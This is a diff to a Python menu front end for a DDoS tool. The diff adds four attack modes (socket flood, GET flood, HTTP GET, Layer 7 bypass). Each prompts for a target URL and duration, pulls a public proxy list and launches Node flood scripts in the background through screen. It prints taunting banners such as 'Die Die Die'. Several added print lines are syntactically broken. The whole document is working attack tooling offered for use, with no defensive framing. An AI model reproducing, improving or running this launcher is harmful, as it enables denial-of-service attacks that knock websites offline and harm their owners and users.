@@ -44,7 +44,7 @@ class Home:
                 time.sleep(1)
 
     def home(self): 
-        print(f"""{Color.LR}
+        print(f"""{Color.LY}
 
 ┌╌ ╌ ╌ ╌ ╌ ╌ ╌ ╌ ╌  ┐ 󰟗󰦐 󰦊 󰥰 󰟡
  DDos Attack 🐉
@@ -72,26 +72,83 @@ class Home:
                          
      © Developer Nguyễn Anh Tú 
 """)
-        print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LY+" Layer7")
+        print(Color.LY+"["+Color.LC+"01"+Color.LR+"]"+Color.LB+" SOCKET")
+        print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LY+" GET FLOOD")
+        print(Color.LG+"["+Color.LY+"03"+Color.LR+"]"+Color.LB+" HTTP GET")
+        print(Color.LR+"["+Color.LR+"04"+Color.LR+"]"+Color.LG+" BYPASS L7")
         print(Color.LY+"["+Color.LB+"00"+Color.LR+"]"+Color.LC+" OUT")
         print("\n")
         http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
         while True:
-            sys.stdout.write(Color.LB+"^^ "+Color.LR+"["+Color.LC+"Atu x DDoS"+Color.LB+"🦅"+Color.LG+"^^"+Color.LR+"]"+Color.LB+"\n➜ "+Color.RESET)
+            sys.stdout.write(Color.LB+"^^ "+Color.LR+"["+Color.LC+"jwkfrv17"+Color.LB+""+Color.LG+"🦋"+Color.LR+"]"+Color.LB+"\n➜ "+Color.RESET)
             option = input()
             if option == '01' or option == '1':
                 try:
-                    url = str(input(f"{Color.LG} ➾ URL: "+Color.RESET))
-                    floodtime = int(input(f"{Color.LG} ➾ Time: "+Color.RESET))
+                    url = str(input(f"{Color.LG} ⤻ URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} ⤻ Time: "+Color.RESET))
+                    reqs = int(input(f"{Color.LG} cc Reqs: "+Color.RESET))
                     for i in range(200):
-                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
-                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
-                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die ! {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die ! {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die ! {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die ! {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die ! {Color.LG}" + url)
+                        time.sleep(0.01)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/socket {url} nat/http.txt {floodtime} {reqs}'], shell=True)
+                except:
+                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+            elif option == '02' or option == '2':
+                try:
+                    url = str(input(f"{Color.LG} ⤻ URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} ⤻ Time: "+Color.RESET))
+                    for i in range(200):
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        print (f"{Color.LR}Server Error Can't Access Website Lost Connection !
+                        time.sleep(0.02)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/flood GET {url} nat/http.txt {floodtime} 64 1'], shell=True)
+                except:
+                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+            elif option == '03' or option == '3':
+                try:
+                    url = str(input(f"{Color.LG} ⤻ URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} ⤻ Time: "+Color.RESET))
+                    for i in range(200):
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die !  {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die !  {Color.LG}" + url)
+                        print (f"{Color.LR}Die Die Die Die Die Die Die Die !  {Color.LG}" + url)
                         time.sleep(0.01)
                     with open("nat/http.txt", 'w') as p:
                         p.write(httpx.get(http_proxy).text)
                     subprocess.run([f'screen -dm node nat/Method/httpget {url} {floodtime} 1'], shell=True)
-                 except:
+                except:
+                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+            elif option == '04' or option == '4':
+                try:
+                    url = str(input(f"{Color.LG} ⤻ URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} ⤻ Time: "+Color.RESET))
+                    for i in range(200):
+                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️  {Color.LG}" + url)
+                        time.sleep(0.03)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/bypass {url} {floodtime}'], shell=True)
+                except:
                     print(f"{Color.LR}ERROR: {Color.RESET}Try again")
             elif option == 'refresh' or option == 'REFRESH':
                 self.Method()
@@ -148,7 +205,7 @@ def main():
 
 
 if __name__ == '__main__':
-    commands = f"""HOME: Quay Lại Trang Đầu\nREFRESH: Làm Mới Menu\nCLEAN: Xoá Tất Cả\nEXIT: Thoát\nSTOP: Ngừng DDoS\nCONTACT: Contact/Hỗ Trợ"""
-    contact = f"""Facebook: https://www.facebook.com/17th10xxx\nProfile: """
+    commands = f"""HOME: Quay Lại Trang Đầu\nREFRESH: Loading Menu\nCLEAN: Delete\nEXIT: OUT\nSTOP: STOP DDoS\nCONTACT: Contact/Hỗ Trợ"""
+    contact = f"""t.me/jrv17\nProfile: """
     NAT_Tool = Home(commands, contact)
     main()
